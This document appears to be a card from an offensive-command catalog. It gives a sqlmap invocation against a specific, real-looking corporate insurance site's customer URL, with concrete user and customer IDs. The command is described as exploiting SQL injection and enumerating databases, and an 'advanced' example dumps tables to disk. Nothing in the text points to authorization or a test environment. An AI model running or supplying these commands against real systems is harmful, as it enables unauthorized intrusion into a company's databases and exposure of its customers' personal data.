---
id: cmd-001
data: >-
  python sqlmap.py -u
  "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0"
  --batch --dbs
tags:
  - sqli
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.830Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump-database

## Command

```bash
python sqlmap.py -u "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0" --batch --dbs
```

## Description

This command invokes SQLmap to test and exploit SQL injection in the specified URL, marking the customerId parameter with * for the injection point, then enumerates databases in batch mode without prompts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with injection point marked by * | Yes |
| `--batch` | Non-interactive mode | No |
| `--dbs` | Enumerate database names | Yes |

## Examples

### Basic Usage

```bash
python sqlmap.py -u "https://target.com/path/{id*}" --dbs
```

### Advanced Usage

```bash
python sqlmap.py -u "https://target.com/path/{id*}" -D db_name --tables --dump --output-dir=/dumps/
```

## Expected Output

SQLmap will output vulnerability confirmation, DBMS type (e.g., MySQL), and a list of accessible databases. Successful runs produce dump files in the current directory.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-SQLmap]]
